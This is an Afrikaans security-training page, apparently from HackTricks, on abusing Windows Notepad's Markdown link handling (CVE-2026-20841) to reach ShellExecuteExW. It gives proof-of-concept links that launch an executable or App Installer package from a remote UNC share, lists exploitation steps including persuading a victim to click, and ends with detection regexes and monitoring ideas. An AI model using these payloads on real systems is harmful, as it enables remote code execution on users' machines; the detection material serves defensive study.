# Windows-protokolhandtekenaar / ShellExecute-misbruik (Markdown-renderers)

{{#include ../banners/hacktricks-training.md}}

Moderne Windows-toepassings wat Markdown/HTML render, omskep dikwels deur gebruikers aangeleverde skakels in klikbare elemente en gee dit aan `ShellExecuteExW`. Sonder streng skema-allowlisting kan enige geregistreerde protokolhandtekenaar (bv. `file:`, `ms-appinstaller:`) geaktiveer word, wat tot kode-uitvoering in die huidige gebruikerskonteks kan lei.

## ShellExecuteExW surface in Windows Notepad Markdown mode
- Notepad kies Markdown-modus **slegs vir `.md`-uitbreidings** deur 'n vaste stringvergelyking in `sub_1400ED5D0()`.
- Ondersteunde Markdown-skakels:
- Standard: `[text](target)`
- Autolink: `<target>` (gerender as `[target](target)`), so beide sintakse is van belang vir payloads en detections.
- Skakelklikke word verwerk in `sub_140170F60()`, wat swak filtering uitvoer en daarna `ShellExecuteExW` aanroep.
- `ShellExecuteExW` stuur aan **enige geconfigureerde protokolhandtekenaar**, nie net HTTP(S) nie.

### Payload considerations
- Enige `\\` patrone in die skakel word **genormaliseer na `\`** voor `ShellExecuteExW`, wat UNC/pad-skepping en detection raak.
- `.md`-lêers is **nie standaard met Notepad geassosieer nie**; die slagoffer moet steeds die lêer in Notepad oopmaak en op die skakel klik, maar sodra dit gerender is, is die skakel klikbaar.
- Gevaarlike voorbeeldskemas:
- `file://` om 'n plaaslike/UNC payload te begin.
- `ms-appinstaller://` om App Installer flows te aktiveer. Ander plaaslik geregistreerde skemas kan ook misbruikbaar wees.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Uitbuitingsvloei
1. Skep 'n **`.md` file** sodat Notepad dit as Markdown weergee.
2. Voeg 'n skakel in wat 'n gevaarlike URI-skema gebruik (`file:`, `ms-appinstaller:`, of enige geïnstalleerde handler).
3. Lewer die lêer (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB of soortgelyk) en oortuig die gebruiker om dit in Notepad oop te maak.
4. Wanneer geklik word, word die **genormaliseerde skakel** aan `ShellExecuteExW` gegee en die ooreenstemmende protokolhandler voer die verwysde inhoud in die gebruiker se konteks uit.

## Opsporingsideeë
- Moniteer oordragte van `.md`-lêers oor poorte/protokolle wat gewoonlik dokumente lewer: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Parseer Markdown-skakels (standard en autolink) en soek na **ongevoelig vir hoof- en kleinletters** `file:` of `ms-appinstaller:`.
- Verskaffer-geleide regexes om toegang tot afgeleë hulpbronne op te vang:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Volgens berigte laat die patchgedrag **allowlists local files and HTTP(S)** toe; enigiets anders wat `ShellExecuteExW` bereik, is verdag. Brei opsporings uit na ander geïnstalleerde protokolbehandelaars waar nodig, aangesien die aanvaloppervlak per stelsel verskil.

## Verwysings
- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
